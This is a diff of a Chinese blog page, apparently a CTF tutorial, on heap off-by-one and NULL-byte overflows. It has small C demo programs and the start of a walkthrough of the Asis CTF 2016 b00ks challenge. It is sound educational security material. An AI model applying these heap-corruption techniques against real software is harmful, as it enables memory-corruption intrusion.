@@ -1,28 +1,28 @@
 <!DOCTYPE html>
 <html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
     <meta name="robots" content="noodp" />
-    <title>堆中的off-by-one - Ghostasky&#39;s Blog</title><meta name="author" content="">
+    <title>堆中的off-by-One - Ghostasky&#39;s Blog</title><meta name="author" content="Ghostasky">
 <meta name="author-link" content="">
-<meta name="description" content="" /><meta name="keywords" content='PWN' /><meta itemprop="name" content="堆中的off-by-one">
-<meta itemprop="description" content=""><meta itemprop="datePublished" content="2021-03-21T02:29:42+00:00" />
+<meta name="description" content="[TOC] 介绍 off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且只越界了一个字节。 漏洞原理 这种漏洞的产生往往与边界严重不严格和字符串操作有关，其中边界验证不严通常" /><meta name="keywords" content='PWN' /><meta itemprop="name" content="堆中的off-by-one">
+<meta itemprop="description" content="[TOC] 介绍 off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且只越界了一个字节。 漏洞原理 这种漏洞的产生往往与边界严重不严格和字符串操作有关，其中边界验证不严通常"><meta itemprop="datePublished" content="2021-03-21T02:29:42+00:00" />
 <meta itemprop="dateModified" content="2021-03-21T02:29:42+00:00" />
-<meta itemprop="wordCount" content="5114">
+<meta itemprop="wordCount" content="5126">
 <meta itemprop="keywords" content="PWN," /><meta property="og:title" content="堆中的off-by-one" />
-<meta property="og:description" content="" />
+<meta property="og:description" content="[TOC] 介绍 off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且只越界了一个字节。 漏洞原理 这种漏洞的产生往往与边界严重不严格和字符串操作有关，其中边界验证不严通常" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://ghostasky.github.io/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-03-21T02:29:42+00:00" />
 <meta property="article:modified_time" content="2021-03-21T02:29:42+00:00" />
 <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="堆中的off-by-one"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:description" content="[TOC] 介绍 off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且只越界了一个字节。 漏洞原理 这种漏洞的产生往往与边界严重不严格和字符串操作有关，其中边界验证不严通常"/>
 <meta name="application-name" content="FixIt">
 <meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" /><link rel="prev" href="http://localhost:1313/posts/%E7%AE%80%E5%8D%95%E5%A0%86%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/" /><link rel="next" href="http://localhost:1313/posts/chunk-extend-and-overlapping/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" /><link rel="prev" href="http://ghostasky.github.io/posts/%E7%AE%80%E5%8D%95%E5%A0%86%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/" /><link rel="next" href="http://ghostasky.github.io/posts/chunk-extend-and-overlapping/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
   {
@@ -32,20 +32,20 @@
     "inLanguage": "zh-CN",
     "mainEntityOfPage": {
       "@type": "WebPage",
-      "@id": "http:\/\/localhost:1313\/posts\/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one\/"
-    },"genre": "posts","keywords": "PWN","wordcount":  5114 ,
-    "url": "http:\/\/localhost:1313\/posts\/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one\/","datePublished": "2021-03-21T02:29:42+00:00","dateModified": "2021-03-21T02:29:42+00:00","publisher": {
+      "@id": "http:\/\/ghostasky.github.io\/posts\/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one\/"
+    },"genre": "posts","keywords": "PWN","wordcount":  5126 ,
+    "url": "http:\/\/ghostasky.github.io\/posts\/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one\/","datePublished": "2021-03-21T02:29:42+00:00","dateModified": "2021-03-21T02:29:42+00:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
         "@type": "Person",
-        "name": "作者"
+        "name": "Ghostasky"
       },"description": ""
   }
   </script></head>
-  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <body data-header-desktop="auto" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
   <div class="header-wrapper">
     <div class="header-title">
-      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
     <nav>
       <ul class="menu"><li class="menu-item">
               <a
@@ -80,7 +80,7 @@
   <div class="header-container">
     <div class="header-wrapper">
       <div class="header-title">
-        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
       <div class="menu-toggle" id="menu-toggle-mobile">
         <span></span><span></span><span></span>
       </div>
@@ -122,10 +122,9 @@
 </header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
 
   <article class="page single">
-    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>堆中的off-by-one</span>
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>堆中的off-by-One</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
-      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2021-03-21 02:29:42"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-03-21">2021-03-21</time></span>&nbsp;<span title="5114 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 5200 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 11 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky" data-title="Ghostasky" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ghostasky</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2021-03-21 02:29:42"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-03-21">2021-03-21</time></span>&nbsp;<span title="5126 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 5200 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 11 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -145,17 +144,26 @@
   </ul>
 </nav></div>
       </div><div class="content" id="content"><p>[TOC]</p>
-<h3 id="介绍" class="heading-element">
-  <a href="#%e4%bb%8b%e7%bb%8d" class="heading-mark"></a>介绍</h3><p>off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且只越界了一个字节。</p>
-<h3 id="漏洞原理" class="heading-element">
-  <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86" class="heading-mark"></a>漏洞原理</h3><p>这种漏洞的产生往往与边界严重不严格和字符串操作有关，其中边界验证不严通常包括：</p>
+<h3 id="介绍" class="heading-element"><span>介绍</span>
+  <a href="#%e4%bb%8b%e7%bb%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且只越界了一个字节。</p>
+<h3 id="漏洞原理" class="heading-element"><span>漏洞原理</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>这种漏洞的产生往往与边界严重不严格和字符串操作有关，其中边界验证不严通常包括：</p>
 <ul>
 <li>使用循环写入时，循环的次数设置有误。</li>
 <li>字符串操作不合适</li>
 </ul>
 <p>一般来说，单字节溢出很难利用，但是因为Linux的堆管理机制ptmalloc验证的松散性，基于Linux堆的off-by-one是可以基于各种缓冲区的，比如栈，bss段等，但是堆上的off-by-one是CTF中比较常见的，这里仅讨论heap上的off-by-one情况。</p>
-<h3 id="利用思路" class="heading-element">
-  <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" class="heading-mark"></a>利用思路</h3><ol>
+<h3 id="利用思路" class="heading-element"><span>利用思路</span>
+  <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ol>
 <li>溢出字节为可控制任意字节：通过修改大小造成块之间出现重叠，从而泄露其他块的数据，或是覆盖其他块数据。也可使用NULL字节溢出的方法。</li>
 <li>溢出字节为NULL字节：溢出NULL字节可以使得<code>prev_in_use</code>位被清，这样前一个块会被认为是free块
 <ol>
@@ -165,9 +173,15 @@
 </li>
 </ol>
 <p>在最新版的代码中已加入针对2中后一种方法的check，但在2.28之前并没有该check。</p>
-<h3 id="示例" class="heading-element">
-  <a href="#%e7%a4%ba%e4%be%8b" class="heading-mark"></a>示例</h3><h4 id="示例1" class="heading-element">
-  <a href="#%e7%a4%ba%e4%be%8b1" class="heading-mark"></a>示例1</h4><div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include&lt;stdio.h&gt;
+<h3 id="示例" class="heading-element"><span>示例</span>
+  <a href="#%e7%a4%ba%e4%be%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="示例1" class="heading-element"><span>示例1</span>
+  <a href="#%e7%a4%ba%e4%be%8b1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include&lt;stdio.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include&lt;stdlib.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">my_gets</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
@@ -187,8 +201,11 @@
 </span></span><span class="line"><span class="cl">    <span class="nf">my_gets</span><span class="p">(</span><span class="n">chunk1</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>输入17*‘a’后会发现数据覆盖到了下一个堆块的prev_size。</p>
-<h4 id="示例2" class="heading-element">
-  <a href="#%e7%a4%ba%e4%be%8b2" class="heading-mark"></a>示例2</h4><div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include&lt;stdio.h&gt;
+<h4 id="示例2" class="heading-element"><span>示例2</span>
+  <a href="#%e7%a4%ba%e4%be%8b2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include&lt;stdio.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include&lt;stdlib.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include&lt;string.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
@@ -206,8 +223,11 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>通过调试可以发现next chunk 的size域的低字节被结束符<code>\x00</code>覆盖，</p>
 <p>这属于off-by-one的一个分支，叫做NULL byte off-by-one，之后会看到off-by-one与NULL byte off-by-one在利用上的区别。</p>
-<h3 id="实例1asis-ctf-2016-b00ks" class="heading-element">
-  <a href="#%e5%ae%9e%e4%be%8b1asis-ctf-2016-b00ks" class="heading-mark"></a>实例1：Asis CTF 2016 b00ks</h3><pre tabindex="0"><code>yutao@pwnbaby:~/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks$ file b00ks 
+<h3 id="实例1asis-ctf-2016-b00ks" class="heading-element"><span>实例1：Asis CTF 2016 b00ks</span>
+  <a href="#%e5%ae%9e%e4%be%8b1asis-ctf-2016-b00ks" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><pre tabindex="0"><code>yutao@pwnbaby:~/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks$ file b00ks 
 b00ks: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=cdcd9edea919e679ace66ad54da9281d3eb09270, stripped
 yutao@pwnbaby:~/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks$ checksec b00ks
 [*] &#39;/home/yutao/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks/b00ks&#39;
@@ -227,16 +247,19 @@ yutao@pwnbaby:~/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks$ checksec b00
 3. Edit a book
 4. Print book detail
 5. Change current author name
-6. Exit</code></pre><h4 id="create" class="heading-element">
-  <a href="#create" class="heading-mark"></a>Create</h4><p>先确定size</p>
-<div class="highlight" id="id-5"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Enter book name size: &#34;</span><span class="p">);</span>
+6. Exit</code></pre><h4 id="create" class="heading-element"><span>Create</span>
+  <a href="#create" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>先确定size</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Enter book name size: &#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter book name (Max 32 chars): &#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">ptr</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span></span></span></code></pre></div><p>之后是description大小</p>
-<div class="highlight" id="id-6"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Enter book description size: &#34;</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Enter book description size: &#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">v5</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span></span></span></code></pre></div><p>再之后分配book：</p>
-<div class="highlight" id="id-7"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter book description: &#34;</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter book description: &#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">v3</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20uLL</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span><span class="c1">//size
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">off_202010</span> <span class="o">+</span> <span class="n">v2</span><span class="p">)</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
@@ -244,14 +267,14 @@ yutao@pwnbaby:~/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks$ checksec b00
